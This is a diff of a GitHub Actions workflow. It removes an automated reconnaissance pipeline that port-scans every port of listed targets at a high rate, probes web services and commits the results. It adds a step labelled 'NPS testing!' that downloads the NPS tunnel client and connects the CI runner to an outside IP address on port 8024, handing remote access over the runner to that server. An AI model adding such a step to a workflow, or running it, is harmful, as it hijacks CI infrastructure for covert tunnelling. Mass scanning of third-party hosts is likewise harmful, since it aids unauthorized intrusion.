@@ -27,47 +27,15 @@ jobs:
           path: /home/runner/go
           key: ${{ runner.os }}-go
 
-      - name: Setting up ProjectDiscovery tools
-        if: steps.cache-go.outputs.cache-hit != 'true'
-        env:
-          GO111MODULE: on
+
+
+      - name: NPS testing!
         run: |
-          go get -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder
-          go get -v github.com/projectdiscovery/dnsx/cmd/dnsx
-          go get -v github.com/projectdiscovery/naabu/v2/cmd/naabu
-          go get -v github.com/projectdiscovery/httpx/cmd/httpx
-          go get -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei
+          wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_client.tar.gz
+          tar -zxvf linux_amd64_client.tar.gz
+          ./npc -server=81.68.104.42:8024 -vkey=github -type=tcp
+          
         shell: bash
 
 
-      - name: Running naabu to check top all ports
-        run: |
-          naabu -iL input/target.txt  -rate 10000 -p - | tee output/active_ports.txt
-        shell: bash
-
-
-      - name: Running httpx for HTTP webservers probbing
-        run: |
-          httpx -l output/active_ports.txt -title
-          httpx -l output/active_ports.txt | tee output/active_urls.txt
-        shell: bash
-
-      - name: Sorting the output results
-        run: |
-          find output -type f -exec sort {} -o {} \;
-        shell: bash
-
-      - name: Create local changes
-        run: |
-          git add output/active_ports.txt
-          git add output/active_urls.txt
-      - name: Commit results to Github
-        run: |
-          git config --local user.email "admin@inbug.org"
-          git config --global user.name "inbug-team"
-          git commit -m "InCloud Report" -a --allow-empty
-      - name: Push changes
-        uses: ad-m/github-push-action@master
-        with:
-          github_token: ${{ secrets.GITHUB_TOKEN }}
-          branch: ${{ github.ref }}
+     
